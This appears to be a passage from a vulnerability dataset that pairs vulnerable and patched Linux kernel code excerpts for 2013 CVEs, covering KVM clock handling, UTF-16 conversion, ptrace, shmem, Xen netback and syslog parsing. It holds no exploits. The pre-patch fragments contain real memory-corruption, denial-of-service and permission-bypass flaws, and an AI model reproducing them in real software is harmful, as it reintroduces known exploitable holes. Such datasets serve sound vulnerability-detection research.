	vcpu->hv_clock.flags = pvclock_flags;

 memcpy(shared_kaddr + vcpu->time_offset, &vcpu->hv_clock,
 sizeof(vcpu->hv_clock));

 kunmap_atomic(shared_kaddr);

 mark_page_dirty(v->kvm, vcpu->time >> PAGE_SHIFT);
 return 0;
}


static void kvmclock_reset(struct kvm_vcpu *vcpu)
{
 if (vcpu->arch.time_page) {
 kvm_release_page_dirty(vcpu->arch.time_page);
		vcpu->arch.time_page = NULL;
	}
}

static void accumulate_steal_time(struct kvm_vcpu *vcpu)
 break;
 case MSR_KVM_SYSTEM_TIME_NEW:
 case MSR_KVM_SYSTEM_TIME: {

 kvmclock_reset(vcpu);

		vcpu->arch.time = data;
 if (!(data & 1))
 break;

 /* ...but clean it before doing the actual write */
		vcpu->arch.time_offset = data & ~(PAGE_MASK | 1);

 /* Check that the address is 32-byte aligned. */
 if (vcpu->arch.time_offset &
				(sizeof(struct pvclock_vcpu_time_info) - 1))
 break;

		vcpu->arch.time_page =
  gfn_to_page(vcpu->kvm, data >> PAGE_SHIFT);

 if (is_error_page(vcpu->arch.time_page))
			vcpu->arch.time_page = NULL;

 break;
	}
 */
static int kvm_set_guest_paused(struct kvm_vcpu *vcpu)
{
 if (!vcpu->arch.time_page)
 return -EINVAL;
	vcpu->arch.pvclock_set_guest_stopped_request = true;
 kvm_make_request(KVM_REQ_CLOCK_UPDATE, vcpu);
 goto fail_free_wbinvd_dirty_mask;

	vcpu->arch.ia32_tsc_adjust_msr = 0x0;

 kvm_async_pf_hash_reset(vcpu);
 kvm_pmu_init(vcpu);

"," gpa_t time;
 struct pvclock_vcpu_time_info hv_clock;
 unsigned int hw_tsc_khz;
 struct gfn_to_hva_cache pv_time;
 bool pv_time_enabled;
 /* set guest stopped flag in pvclock flags field */
 bool pvclock_set_guest_stopped_request;

 unsigned long flags, this_tsc_khz;
 struct kvm_vcpu_arch *vcpu = &v->arch;
 struct kvm_arch *ka = &v->kvm->arch;

	s64 kernel_ns, max_kernel_ns;
	u64 tsc_timestamp, host_tsc;
 struct pvclock_vcpu_time_info guest_hv_clock;
	u8 pvclock_flags;
 bool use_master_clock;


 local_irq_restore(flags);

 if (!vcpu->pv_time_enabled)
 return 0;

 /*
 */
	vcpu->hv_clock.version += 2;

 if (unlikely(kvm_read_guest_cached(v->kvm, &vcpu->pv_time,
		&guest_hv_clock, sizeof(guest_hv_clock))))
  return 0;

 /* retain PVCLOCK_GUEST_STOPPED if set in guest copy */
	pvclock_flags = (guest_hv_clock.flags & PVCLOCK_GUEST_STOPPED);

 if (vcpu->pvclock_set_guest_stopped_request) {
		pvclock_flags |= PVCLOCK_GUEST_STOPPED;

	vcpu->hv_clock.flags = pvclock_flags;

 kvm_write_guest_cached(v->kvm, &vcpu->pv_time,
				&vcpu->hv_clock,
 sizeof(vcpu->hv_clock));



 return 0;
}


static void kvmclock_reset(struct kvm_vcpu *vcpu)
{
	vcpu->arch.pv_time_enabled = false;



}

static void accumulate_steal_time(struct kvm_vcpu *vcpu)
 break;
 case MSR_KVM_SYSTEM_TIME_NEW:
 case MSR_KVM_SYSTEM_TIME: {
		u64 gpa_offset;
 kvmclock_reset(vcpu);

		vcpu->arch.time = data;
 if (!(data & 1))
 break;

		gpa_offset = data & ~(PAGE_MASK | 1);


 /* Check that the address is 32-byte aligned. */
 if (gpa_offset & (sizeof(struct pvclock_vcpu_time_info) - 1))

 break;

 if (kvm_gfn_to_hva_cache_init(vcpu->kvm,
      &vcpu->arch.pv_time, data & ~1ULL))
			vcpu->arch.pv_time_enabled = false;
 else
			vcpu->arch.pv_time_enabled = true;

 break;
	}
 */
static int kvm_set_guest_paused(struct kvm_vcpu *vcpu)
{
 if (!vcpu->arch.pv_time_enabled)
 return -EINVAL;
	vcpu->arch.pvclock_set_guest_stopped_request = true;
 kvm_make_request(KVM_REQ_CLOCK_UPDATE, vcpu);
 goto fail_free_wbinvd_dirty_mask;

	vcpu->arch.ia32_tsc_adjust_msr = 0x0;
	vcpu->arch.pv_time_enabled = false;
 kvm_async_pf_hash_reset(vcpu);
 kvm_pmu_init(vcpu);

"
2013,DoS Overflow Mem. Corr. ,CVE-2013-1796," /* ...but clean it before doing the actual write */
		vcpu->arch.time_offset = data & ~(PAGE_MASK | 1);






		vcpu->arch.time_page =
 gfn_to_page(vcpu->kvm, data >> PAGE_SHIFT);

"," /* ...but clean it before doing the actual write */
		vcpu->arch.time_offset = data & ~(PAGE_MASK | 1);

 /* Check that the address is 32-byte aligned. */
 if (vcpu->arch.time_offset &
				(sizeof(struct pvclock_vcpu_time_info) - 1))
 break;

		vcpu->arch.time_page =
 gfn_to_page(vcpu->kvm, data >> PAGE_SHIFT);

"
2013,DoS ,CVE-2013-1792,"
 kenter(""%p{%u}"", user, uid);

 if (user->uid_keyring) {
 kleave("" = 0 [exist]"");
 return 0;
	}
","
 kenter(""%p{%u}"", user, uid);

 if (user->uid_keyring && user->session_keyring) {
 kleave("" = 0 [exist]"");
 return 0;
	}
"
2013,DoS ,CVE-2013-1774," wait_queue_t wait;
 unsigned long flags;




 if (!timeout)
		timeout = (HZ * EDGE_CLOSING_WAIT)/100;

"," wait_queue_t wait;
 unsigned long flags;

 if (!tty)
 return;

 if (!timeout)
		timeout = (HZ * EDGE_CLOSING_WAIT)/100;

"
2013,DoS Overflow +Priv ,CVE-2013-1773,"	 * The windows host expects the key/value pair to be encoded
	 * in utf16.
 */
	keylen = utf8s_to_utf16s(key_name, strlen(key_name),
				(wchar_t *)kvp_data->data.key);

	kvp_data->data.key_size = 2*(keylen + 1); /* utf16 encoding */
	valuelen = utf8s_to_utf16s(value, strlen(value),
				(wchar_t *)kvp_data->data.value);

	kvp_data->data.value_size = 2*(valuelen + 1); /* utf16 encoding */

	kvp_data->data.value_type = REG_SZ; /* all our values are strings */
 int charlen;

 if (utf8) {
		*outlen = utf8s_to_utf16s(name, len, (wchar_t *)outname);

 if (*outlen < 0)
 return *outlen;
 else if (*outlen > FAT_LFN_LEN)
}
EXPORT_SYMBOL(utf32_to_utf8);

int utf8s_to_utf16s(const u8 *s, int len, wchar_t *pwcs)
















{
	u16 *op;
 int size;
 unicode_t u;

	op = pwcs;
 while (*s && len > 0) {
 if (*s & 0x80) {
			size = utf8_to_utf32(s, len, &u);
 if (size < 0)
 return -EINVAL;



 if (u >= PLANE_SIZE) {


				u -= PLANE_SIZE;
				*op++ = (wchar_t) (SURROGATE_PAIR |
						((u >> 10) & SURROGATE_BITS));
				*op++ = (wchar_t) (SURROGATE_PAIR |

						SURROGATE_LOW |
						(u & SURROGATE_BITS));


			} else {
				*op++ = (wchar_t) u;

			}
			s += size;
			len -= size;
		} else {
 *op++ = *s++;
			len--;

		}
	}
 return op - pwcs;
	UTF16_BIG_ENDIAN
};

/* nls.c */
extern int register_nls(struct nls_table *);
extern int unregister_nls(struct nls_table *);
extern struct nls_table *load_nls(char *);

extern int utf8_to_utf32(const u8 *s, int len, unicode_t *pu);
extern int utf32_to_utf8(unicode_t u, u8 *s, int maxlen);
extern int utf8s_to_utf16s(const u8 *s, int len, wchar_t *pwcs);

extern int utf16s_to_utf8s(const wchar_t *pwcs, int len,
 enum utf16_endian endian, u8 *s, int maxlen);

","	 * The windows host expects the key/value pair to be encoded
	 * in utf16.
 */
	keylen = utf8s_to_utf16s(key_name, strlen(key_name), UTF16_HOST_ENDIAN,
				(wchar_t *) kvp_data->data.key,
				HV_KVP_EXCHANGE_MAX_KEY_SIZE / 2);
	kvp_data->data.key_size = 2*(keylen + 1); /* utf16 encoding */
	valuelen = utf8s_to_utf16s(value, strlen(value), UTF16_HOST_ENDIAN,
				(wchar_t *) kvp_data->data.value,
				HV_KVP_EXCHANGE_MAX_VALUE_SIZE / 2);
	kvp_data->data.value_size = 2*(valuelen + 1); /* utf16 encoding */

	kvp_data->data.value_type = REG_SZ; /* all our values are strings */
 int charlen;

 if (utf8) {
		*outlen = utf8s_to_utf16s(name, len, UTF16_HOST_ENDIAN,
				(wchar_t *) outname, FAT_LFN_LEN + 2);
 if (*outlen < 0)
 return *outlen;
 else if (*outlen > FAT_LFN_LEN)
}
EXPORT_SYMBOL(utf32_to_utf8);

static inline void put_utf16(wchar_t *s, unsigned c, enum utf16_endian endian)
{
 switch (endian) {
 default:
		*s = (wchar_t) c;
 break;
 case UTF16_LITTLE_ENDIAN:
		*s = __cpu_to_le16(c);
 break;
 case UTF16_BIG_ENDIAN:
		*s = __cpu_to_be16(c);
 break;
	}
}

int utf8s_to_utf16s(const u8 *s, int len, enum utf16_endian endian,
 wchar_t *pwcs, int maxlen)
{
	u16 *op;
 int size;
 unicode_t u;

	op = pwcs;
 while (len > 0 && maxlen > 0 && *s) {
 if (*s & 0x80) {
			size = utf8_to_utf32(s, len, &u);
 if (size < 0)
 return -EINVAL;
			s += size;
			len -= size;

 if (u >= PLANE_SIZE) {
 if (maxlen < 2)
 break;
				u -= PLANE_SIZE;
 put_utf16(op++, SURROGATE_PAIR |
						((u >> 10) & SURROGATE_BITS),
						endian);
 put_utf16(op++, SURROGATE_PAIR |
						SURROGATE_LOW |
						(u & SURROGATE_BITS),
						endian);
				maxlen -= 2;
			} else {
 put_utf16(op++, u, endian);
				maxlen--;
			}


		} else {
 put_utf16(op++, *s++, endian);
			len--;
			maxlen--;
		}
	}
 return op - pwcs;
	UTF16_BIG_ENDIAN
};

/* nls_base.c */
extern int register_nls(struct nls_table *);
extern int unregister_nls(struct nls_table *);
extern struct nls_table *load_nls(char *);

extern int utf8_to_utf32(const u8 *s, int len, unicode_t *pu);
extern int utf32_to_utf8(unicode_t u, u8 *s, int maxlen);
extern int utf8s_to_utf16s(const u8 *s, int len,
 enum utf16_endian endian, wchar_t *pwcs, int maxlen);
extern int utf16s_to_utf8s(const wchar_t *pwcs, int len,
 enum utf16_endian endian, u8 *s, int maxlen);

"
2013,DoS Overflow ,CVE-2013-1772,"#define SYSLOG_FROM_CALL 0
#define SYSLOG_FROM_FILE 1







int do_syslog(int type, char __user *buf, int count, bool from_file);

#endif /* _LINUX_SYSLOG_H */
	start_print = start;
 while (cur_index != end) {
 if (msg_level < 0 && ((end - cur_index) > 2)) {











 /* strip log prefix */
			cur_index += log_prefix(&LOG_BUF(cur_index), &msg_level, NULL);
			start_print = cur_index;
		}
 while (cur_index != end) {
","#define SYSLOG_FROM_CALL 0
#define SYSLOG_FROM_FILE 1

/*
 * Syslog priority (PRI) maximum length in char : '<[0-9]{1,3}>'
 * See RFC5424 for details
*/
#define SYSLOG_PRI_MAX_LENGTH 5

int do_syslog(int type, char __user *buf, int count, bool from_file);

#endif /* _LINUX_SYSLOG_H */
	start_print = start;
 while (cur_index != end) {
 if (msg_level < 0 && ((end - cur_index) > 2)) {
 /*
			 * prepare buf_prefix, as a contiguous array,
			 * to be processed by log_prefix function
 */
 char buf_prefix[SYSLOG_PRI_MAX_LENGTH+1];
 unsigned i;
 for (i = 0; i < ((end - cur_index)) && (i < SYSLOG_PRI_MAX_LENGTH); i++) {
				buf_prefix[i] = LOG_BUF(cur_index + i);
			}
			buf_prefix[i] = '\0'; /* force '\0' as last string character */

 /* strip log prefix */
			cur_index += log_prefix((const char *)&buf_prefix, &msg_level, NULL);
			start_print = cur_index;
		}
 while (cur_index != end) {
"
2013,DoS +Priv ,CVE-2013-1767," unsigned long inodes;
 int error = -EINVAL;


 if (shmem_parse_options(data, &config, true))
 return error;

	sbinfo->max_inodes  = config.max_inodes;
	sbinfo->free_inodes = config.max_inodes - inodes;

 mpol_put(sbinfo->mpol);
	sbinfo->mpol        = config.mpol;	/* transfers initial ref */





out:
 spin_unlock(&sbinfo->stat_lock);
 return error;
"," unsigned long inodes;
 int error = -EINVAL;

	config.mpol = NULL;
 if (shmem_parse_options(data, &config, true))
 return error;

	sbinfo->max_inodes  = config.max_inodes;
	sbinfo->free_inodes = config.max_inodes - inodes;

 /*
	 * Preserve previous mempolicy unless mpol remount option was specified.
 */
 if (config.mpol) {
 mpol_put(sbinfo->mpol);
		sbinfo->mpol = config.mpol;	/* transfers initial ref */
	}
out:
 spin_unlock(&sbinfo->stat_lock);
 return error;
"
2013,#NAME?,CVE-2013-1763," if (nlmsg_len(nlh) < sizeof(*req))
 return -EINVAL;




	hndl = sock_diag_lock_handler(req->sdiag_family);
 if (hndl == NULL)
		err = -ENOENT;
"," if (nlmsg_len(nlh) < sizeof(*req))
 return -EINVAL;

 if (req->sdiag_family >= AF_MAX)
 return -EINVAL;

	hndl = sock_diag_lock_handler(req->sdiag_family);
 if (hndl == NULL)
		err = -ENOENT;
"
2013,DoS ,CVE-2013-1059,,
2013,Bypass ,CVE-2013-0914," if (force_default || ka->sa.sa_handler != SIG_IGN)
			ka->sa.sa_handler = SIG_DFL;
		ka->sa.sa_flags = 0;



 sigemptyset(&ka->sa.sa_mask);
		ka++;
	}
"," if (force_default || ka->sa.sa_handler != SIG_IGN)
			ka->sa.sa_handler = SIG_DFL;
		ka->sa.sa_flags = 0;
#ifdef SA_RESTORER
		ka->sa.sa_restorer = NULL;
#endif
 sigemptyset(&ka->sa.sa_mask);
		ka++;
	}
"
2013,DoS Overflow ,CVE-2013-0913,,
2013,#NAME?,CVE-2013-0871,"	 * Ensure irq/preemption can't change debugctl in between.
	 * Note also that both TIF_BLOCKSTEP and debugctl should
	 * be changed atomically wrt preemption.
	 * FIXME: this means that set/clear TIF_BLOCKSTEP is simply
	 * wrong if task != current, SIGKILL can wakeup the stopped
	 * tracee and set/clear can play with the running task, this
	 * can confuse the next __switch_to_xtra().

 */
 local_irq_disable();
	debugctl = get_debugctlmsr();
 spin_unlock(&child->sighand->siglock);
}



































/**
 * ptrace_check_attach - check whether ptracee is ready for ptrace operation
 * @child: ptracee to check for
	 * be changed by us so it's not changing right after this.
 */
 read_lock(&tasklist_lock);
 if ((child->ptrace & PT_PTRACED) && child->parent == current) {

 /*
		 * child->sighand can't be NULL, release_task()
		 * does ptrace_unlink() before __exit_signal().
 */
 spin_lock_irq(&child->sighand->siglock);
 WARN_ON_ONCE(task_is_stopped(child));
 if (ignore_state || (task_is_traced(child) &&
				     !(child->jobctl & JOBCTL_LISTENING)))
			ret = 0;
 spin_unlock_irq(&child->sighand->siglock);
	}
 read_unlock(&tasklist_lock);

 if (!ret && !ignore_state)
		ret = wait_task_inactive(child, TASK_TRACED) ? 0 : -ESRCH;










 /* All systems go.. */
 return ret;
}

 goto out_put_task_struct;

	ret = arch_ptrace(child, request, addr, data);



 out_put_task_struct:
 put_task_struct(child);

	ret = ptrace_check_attach(child, request == PTRACE_KILL ||
				  request == PTRACE_INTERRUPT);
 if (!ret)
		ret = compat_arch_ptrace(child, request, addr, data);




 out_put_task_struct:
 put_task_struct(child);
	 * If SIGKILL was already sent before the caller unlocked
	 * ->siglock we must see ->core_state != NULL. Otherwise it
	 * is safe to enter schedule().




 */
 if (unlikely(current->mm->core_state) &&
 unlikely(current->mm == current->parent->mm))
 if (gstop_done)
 do_notify_parent_cldstop(current, false, why);


 __set_current_state(TASK_RUNNING);
 if (clear_code)
			current->exit_code = 0;
","	 * Ensure irq/preemption can't change debugctl in between.
	 * Note also that both TIF_BLOCKSTEP and debugctl should
	 * be changed atomically wrt preemption.
	 *
	 * NOTE: this means that set/clear TIF_BLOCKSTEP is only safe if
	 * task is current or it can't be running, otherwise we can race
	 * with __switch_to_xtra(). We rely on ptrace_freeze_traced() but
	 * PTRACE_KILL is not safe.
 */
 local_irq_disable();
	debugctl = get_debugctlmsr();
 spin_unlock(&child->sighand->siglock);
}

/* Ensure that nothing can wake it up, even SIGKILL */
static bool ptrace_freeze_traced(struct task_struct *task)
{
 bool ret = false;

 /* Lockless, nobody but us can set this flag */
 if (task->jobctl & JOBCTL_LISTENING)
 return ret;

 spin_lock_irq(&task->sighand->siglock);
 if (task_is_traced(task) && !__fatal_signal_pending(task)) {
		task->state = __TASK_TRACED;
		ret = true;
	}
 spin_unlock_irq(&task->sighand->siglock);

 return ret;
}

static void ptrace_unfreeze_traced(struct task_struct *task)
{
 if (task->state != __TASK_TRACED)
 return;

 WARN_ON(!task->ptrace || task->parent != current);

 spin_lock_irq(&task->sighand->siglock);
 if (__fatal_signal_pending(task))
 wake_up_state(task, __TASK_TRACED);
 else
		task->state = TASK_TRACED;
 spin_unlock_irq(&task->sighand->siglock);
}

/**
 * ptrace_check_attach - check whether ptracee is ready for ptrace operation
 * @child: ptracee to check for
	 * be changed by us so it's not changing right after this.
 */
 read_lock(&tasklist_lock);
 if (child->ptrace && child->parent == current) {
 WARN_ON(child->state == __TASK_TRACED);
 /*
		 * child->sighand can't be NULL, release_task()
		 * does ptrace_unlink() before __exit_signal().
 */
 if (ignore_state || ptrace_freeze_traced(child))



			ret = 0;

	}
 read_unlock(&tasklist_lock);

 if (!ret && !ignore_state) {
 if (!wait_task_inactive(child, __TASK_TRACED)) {
 /*
			 * This can only happen if may_ptrace_stop() fails and
			 * ptrace_stop() changes ->state back to TASK_RUNNING,
			 * so we should not worry about leaking __TASK_TRACED.
 */
 WARN_ON(child->state == __TASK_TRACED);
			ret = -ESRCH;
		}
	}


 return ret;
}

 goto out_put_task_struct;

	ret = arch_ptrace(child, request, addr, data);
 if (ret || request != PTRACE_DETACH)
 ptrace_unfreeze_traced(child);

 out_put_task_struct:
 put_task_struct(child);

	ret = ptrace_check_attach(child, request == PTRACE_KILL ||
				  request == PTRACE_INTERRUPT);
 if (!ret) {
		ret = compat_arch_ptrace(child, request, addr, data);
 if (ret || request != PTRACE_DETACH)
 ptrace_unfreeze_traced(child);
	}

 out_put_task_struct:
 put_task_struct(child);
	 * If SIGKILL was already sent before the caller unlocked
	 * ->siglock we must see ->core_state != NULL. Otherwise it
	 * is safe to enter schedule().
	 *
	 * This is almost outdated, a task with the pending SIGKILL can't
	 * block in TASK_TRACED. But PTRACE_EVENT_EXIT can be reported
	 * after SIGKILL was already dequeued.
 */
 if (unlikely(current->mm->core_state) &&
 unlikely(current->mm == current->parent->mm))
 if (gstop_done)
 do_notify_parent_cldstop(current, false, why);

 /* tasklist protects us from ptrace_freeze_traced() */
 __set_current_state(TASK_RUNNING);
 if (clear_code)
			current->exit_code = 0;
"
2013,#NAME?,CVE-2013-0349,"	hid->version = req->version;
	hid->country = req->country;

 strncpy(hid->name, req->name, 128);

 snprintf(hid->phys, sizeof(hid->phys), ""%pMR"",
		 &bt_sk(session->ctrl_sock->sk)->src);
","	hid->version = req->version;
	hid->country = req->country;

 strncpy(hid->name, req->name, sizeof(req->name) - 1);

 snprintf(hid->phys, sizeof(hid->phys), ""%pMR"",
		 &bt_sk(session->ctrl_sock->sk)->src);
"
2013,DoS +Info ,CVE-2013-0343,,
2013,DoS ,CVE-2013-0313,"		rc = __vfs_setxattr_noperm(dentry, XATTR_NAME_EVM,
					   &xattr_data,
 sizeof(xattr_data), 0);
	}
 else if (rc == -ENODATA)
		rc = inode->i_op->removexattr(dentry, XATTR_NAME_EVM);

 return rc;
}

","		rc = __vfs_setxattr_noperm(dentry, XATTR_NAME_EVM,
					   &xattr_data,
 sizeof(xattr_data), 0);
	} else if (rc == -ENODATA && inode->i_op->removexattr) {

		rc = inode->i_op->removexattr(dentry, XATTR_NAME_EVM);
	}
 return rc;
}

"
2013,,CVE-2013-0311,"		}
		_iov = iov + ret;
		size = reg->memory_size - addr + reg->guest_phys_addr;
		_iov->iov_len = min((u64)len, size);
		_iov->iov_base = (void __user *)(unsigned long)
			(reg->userspace_addr + addr - reg->guest_phys_addr);
		s += size;
","		}
		_iov = iov + ret;
		size = reg->memory_size - addr + reg->guest_phys_addr;
		_iov->iov_len = min((u64)len - s, size);
		_iov->iov_base = (void __user *)(unsigned long)
			(reg->userspace_addr + addr - reg->guest_phys_addr);
		s += size;
"
2013,DoS Overflow ,CVE-2013-0310," case CIPSO_V4_TAG_LOCAL:
 /* This is a non-standard tag that we only allow for
			 * local connections, so if the incoming interface is
			 * not the loopback device drop the packet. */
 if (!(skb->dev->flags & IFF_LOOPBACK)) {


				err_offset = opt_iter;
 goto validate_return_locked;
			}
"," case CIPSO_V4_TAG_LOCAL:
 /* This is a non-standard tag that we only allow for
			 * local connections, so if the incoming interface is
			 * not the loopback device drop the packet. Further,
			 * there is no legitimate reason for setting this from
			 * userspace so reject it if skb is NULL. */
 if (skb == NULL || !(skb->dev->flags & IFF_LOOPBACK)) {
				err_offset = opt_iter;
 goto validate_return_locked;
			}
"
2013,DoS Overflow ,CVE-2013-0309,"
static inline int pmd_large(pmd_t pte)
{
 return (pmd_flags(pte) & (_PAGE_PSE | _PAGE_PRESENT)) ==
		(_PAGE_PSE | _PAGE_PRESENT);
}

#ifdef CONFIG_TRANSPARENT_HUGEPAGE

static inline int pmd_present(pmd_t pmd)
{
 return pmd_flags(pmd) & _PAGE_PRESENT;






}

static inline int pmd_none(pmd_t pmd)
","
static inline int pmd_large(pmd_t pte)
{
 return pmd_flags(pte) & _PAGE_PSE;

}

#ifdef CONFIG_TRANSPARENT_HUGEPAGE

static inline int pmd_present(pmd_t pmd)
{
 /*
	 * Checking for _PAGE_PSE is needed too because
	 * split_huge_page will temporarily clear the present bit (but
	 * the _PAGE_PSE flag will remain set at all times while the
	 * _PAGE_PRESENT bit is clear).
 */
 return pmd_flags(pmd) & (_PAGE_PRESENT | _PAGE_PROTNONE | _PAGE_PSE);
}

static inline int pmd_none(pmd_t pmd)
"
2013,DoS ,CVE-2013-0290," skb_queue_walk(queue, skb) {
			*peeked = skb->peeked;
 if (flags & MSG_PEEK) {
 if (*off >= skb->len) {
					*off -= skb->len;
 continue;
				}
"," skb_queue_walk(queue, skb) {
			*peeked = skb->peeked;
 if (flags & MSG_PEEK) {
 if (*off >= skb->len && skb->len) {
					*off -= skb->len;
 continue;
				}
"
2013,Bypass ,CVE-2013-0268," unsigned int cpu;
 struct cpuinfo_x86 *c;




	cpu = iminor(file->f_path.dentry->d_inode);
 if (cpu >= nr_cpu_ids || !cpu_online(cpu))
 return -ENXIO;	/* No such CPU */
"," unsigned int cpu;
 struct cpuinfo_x86 *c;

 if (!capable(CAP_SYS_RAWIO))
 return -EPERM;

	cpu = iminor(file->f_path.dentry->d_inode);
 if (cpu >= nr_cpu_ids || !cpu_online(cpu))
 return -ENXIO;	/* No such CPU */
"
2013,DoS Overflow ,CVE-2013-0231,,
2013,#NAME?,CVE-2013-0228,"	 */
#ifdef CONFIG_SMP
	GET_THREAD_INFO(%eax)
 movl TI_cpu(%eax), %eax
 movl __per_cpu_offset(,%eax,4), %eax
 mov xen_vcpu(%eax), %eax
#else
 movl xen_vcpu, %eax
#endif

	/* check IF state we're restoring */
	 * resuming the code, so we don't have to be worried about
	 * being preempted to another CPU.
	 */
 setz XEN_vcpu_info_mask(%eax)
xen_iret_start_crit:

	/* check for unmasked and pending */
 cmpw $0x0001, XEN_vcpu_info_pending(%eax)

	/*
	 * If there's something pending, mask events again so we can
	 * jump back into xen_hypervisor_callback. Otherwise do not
	 * touch XEN_vcpu_info_mask.
	 */
 jne 1f
 movb $1, XEN_vcpu_info_mask(%eax)

1: popl %eax

","	 */
#ifdef CONFIG_SMP
	GET_THREAD_INFO(%eax)
 movl %ss:TI_cpu(%eax), %eax
 movl %ss:__per_cpu_offset(,%eax,4), %eax
 mov %ss:xen_vcpu(%eax), %eax
#else
 movl %ss:xen_vcpu, %eax
#endif

	/* check IF state we're restoring */
	 * resuming the code, so we don't have to be worried about
	 * being preempted to another CPU.
	 */
 setz %ss:XEN_vcpu_info_mask(%eax)
xen_iret_start_crit:

	/* check for unmasked and pending */
 cmpw $0x0001, %ss:XEN_vcpu_info_pending(%eax)

	/*
	 * If there's something pending, mask events again so we can
	 * jump back into xen_hypervisor_callback. Otherwise do not
	 * touch XEN_vcpu_info_mask.
	 */
 jne 1f
 movb $1, %ss:XEN_vcpu_info_mask(%eax)

1: popl %eax

"
2013,DoS ,CVE-2013-0217," atomic_dec(&netbk->netfront_count);
}

static void xen_netbk_idx_release(struct xen_netbk *netbk, u16 pending_idx);

static void make_tx_response(struct xenvif *vif,
 struct xen_netif_tx_request *txp,
			     s8       st);
{
 struct gnttab_copy *gop = *gopp;
	u16 pending_idx = *((u16 *)skb->data);
 struct pending_tx_info *pending_tx_info = netbk->pending_tx_info;
 struct xenvif *vif = pending_tx_info[pending_idx].vif;
 struct xen_netif_tx_request *txp;
 struct skb_shared_info *shinfo = skb_shinfo(skb);
 int nr_frags = shinfo->nr_frags;
 int i, err, start;

 /* Check status of header. */
	err = gop->status;
 if (unlikely(err)) {
 pending_ring_idx_t index;
 index = pending_index(netbk->pending_prod++);
		txp = &pending_tx_info[pending_idx].req;
 make_tx_response(vif, txp, XEN_NETIF_RSP_ERROR);
		netbk->pending_ring[index] = pending_idx;
 xenvif_put(vif);
	}

 /* Skip first skb fragment if it is on same page as header fragment. */
	start = (frag_get_pending_idx(&shinfo->frags[0]) == pending_idx);

 for (i = start; i < nr_frags; i++) {
 int j, newerr;
 pending_ring_idx_t index;

		pending_idx = frag_get_pending_idx(&shinfo->frags[i]);

 if (likely(!newerr)) {
 /* Had a previous error? Invalidate this fragment. */
 if (unlikely(err))
 xen_netbk_idx_release(netbk, pending_idx);
 continue;
		}

 /* Error on this fragment: respond to client with an error. */
		txp = &netbk->pending_tx_info[pending_idx].req;
 make_tx_response(vif, txp, XEN_NETIF_RSP_ERROR);
 index = pending_index(netbk->pending_prod++);
		netbk->pending_ring[index] = pending_idx;
 xenvif_put(vif);

 /* Not the first error? Preceding frags already invalidated. */
 if (err)
 continue;

 /* First error: invalidate header and preceding fragments. */
		pending_idx = *((u16 *)skb->data);
 xen_netbk_idx_release(netbk, pending_idx);
 for (j = start; j < i; j++) {
			pending_idx = frag_get_pending_idx(&shinfo->frags[j]);
 xen_netbk_idx_release(netbk, pending_idx);
		}

 /* Remember the error: invalidate all subsequent fragments. */

 /* Take an extra reference to offset xen_netbk_idx_release */
 get_page(netbk->mmap_pages[pending_idx]);
 xen_netbk_idx_release(netbk, pending_idx);
	}
}

			txp->size -= data_len;
		} else {
 /* Schedule a response immediately. */
 xen_netbk_idx_release(netbk, pending_idx);
		}

 if (txp->flags & XEN_NETTXF_csum_blank)
 xen_netbk_tx_submit(netbk);
}

static void xen_netbk_idx_release(struct xen_netbk *netbk, u16 pending_idx)

{
 struct xenvif *vif;
 struct pending_tx_info *pending_tx_info;

	vif = pending_tx_info->vif;

 make_tx_response(vif, &pending_tx_info->req, XEN_NETIF_RSP_OKAY);

 index = pending_index(netbk->pending_prod++);
	netbk->pending_ring[index] = pending_idx;
"," atomic_dec(&netbk->netfront_count);
}

static void xen_netbk_idx_release(struct xen_netbk *netbk, u16 pending_idx,
				  u8 status);
static void make_tx_response(struct xenvif *vif,
 struct xen_netif_tx_request *txp,
			     s8       st);
{
 struct gnttab_copy *gop = *gopp;
	u16 pending_idx = *((u16 *)skb->data);



 struct skb_shared_info *shinfo = skb_shinfo(skb);
 int nr_frags = shinfo->nr_frags;
 int i, err, start;

 /* Check status of header. */
	err = gop->status;
 if (unlikely(err))
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_ERROR);







 /* Skip first skb fragment if it is on same page as header fragment. */
	start = (frag_get_pending_idx(&shinfo->frags[0]) == pending_idx);

 for (i = start; i < nr_frags; i++) {
 int j, newerr;


		pending_idx = frag_get_pending_idx(&shinfo->frags[i]);

 if (likely(!newerr)) {
 /* Had a previous error? Invalidate this fragment. */
 if (unlikely(err))
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_OKAY);
 continue;
		}

 /* Error on this fragment: respond to client with an error. */
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_ERROR);





 /* Not the first error? Preceding frags already invalidated. */
 if (err)
 continue;

 /* First error: invalidate header and preceding fragments. */
		pending_idx = *((u16 *)skb->data);
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_OKAY);
 for (j = start; j < i; j++) {
			pending_idx = frag_get_pending_idx(&shinfo->frags[j]);
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_OKAY);
		}

 /* Remember the error: invalidate all subsequent fragments. */

 /* Take an extra reference to offset xen_netbk_idx_release */
 get_page(netbk->mmap_pages[pending_idx]);
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_OKAY);
	}
}

			txp->size -= data_len;
		} else {
 /* Schedule a response immediately. */
 xen_netbk_idx_release(netbk, pending_idx, XEN_NETIF_RSP_OKAY);
		}

 if (txp->flags & XEN_NETTXF_csum_blank)
 xen_netbk_tx_submit(netbk);
}

static void xen_netbk_idx_release(struct xen_netbk *netbk, u16 pending_idx,
				  u8 status)
{
 struct xenvif *vif;
 struct pending_tx_info *pending_tx_info;

	vif = pending_tx_info->vif;

 make_tx_response(vif, &pending_tx_info->req, status);

 index = pending_index(netbk->pending_prod++);
	netbk->pending_ring[index] = pending_idx;
"
2013,DoS ,CVE-2013-0216,"/* Notify xenvif that ring now has space to send an skb to the frontend */
void xenvif_notify_tx_completion(struct xenvif *vif);




/* Returns number of ring slots required to send an skb to the frontend */
unsigned int xen_netbk_count_skb_slots(struct xenvif *vif, struct sk_buff *skb);

 return err;
}

void xenvif_disconnect(struct xenvif *vif)
{
 struct net_device *dev = vif->dev;
 if (netif_carrier_ok(dev)) {
 rtnl_lock();
 netif_carrier_off(dev); /* discard queued packets */
 if (netif_running(dev))
 xenvif_down(vif);
 rtnl_unlock();
 xenvif_put(vif);
	}






 atomic_dec(&vif->refcnt);
 wait_event(vif->waiting_to_free, atomic_read(&vif->refcnt) == 0);
 xenvif_put(vif);
}








static int netbk_count_requests(struct xenvif *vif,
 struct xen_netif_tx_request *first,
 struct xen_netif_tx_request *txp,

 do {
 if (frags >= work_to_do) {
